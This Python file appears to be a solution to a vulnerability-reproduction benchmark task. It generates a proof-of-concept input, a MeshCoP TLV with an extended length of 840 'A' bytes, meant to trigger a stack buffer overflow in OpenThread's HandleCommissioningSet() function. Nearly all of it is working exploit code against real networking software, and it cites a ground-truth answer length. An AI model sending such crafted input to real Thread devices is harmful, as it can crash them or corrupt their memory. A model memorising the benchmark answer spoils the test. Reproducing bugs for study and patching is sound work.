import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability is a Stack Buffer Overflow in the HandleCommissioningSet() function
        in OpenThread's Network Data Leader. It is triggered when a Commissioner Dataset TLV
        uses the extended TLV length format (Length=0xFF followed by 2 bytes length), but the
        implementation fails to reject it or properly check bounds before copying into a 
        stack-allocated structure (likely CommissioningData or similar).
        
        Ground-truth PoC length is 844 bytes.
        This aligns with a 4-byte Extended TLV header + 840 bytes of payload data.
        """
        
        # Use MeshCoP TLV Type 10 (Commissioner ID).
        # This is a standard TLV processed within the dataset.
        tlv_type = 0x0A 
        
        # Target data length. 
        # Total PoC size (844) - TLV Header (4) = 840 bytes.
        data_length = 840
        
        # Construct the buffer
        # Byte 0: Type
        # Byte 1: Length (0xFF indicates extended length follows)
        # Byte 2-3: Extended Length (Big Endian)
        # Byte 4+: Data
        
        poc = bytearray()
        poc.append(tlv_type)
        poc.append(0xFF)
        poc.extend(struct.pack('>H', data_length))
        poc.extend(b'A' * data_length)
        
        return bytes(poc)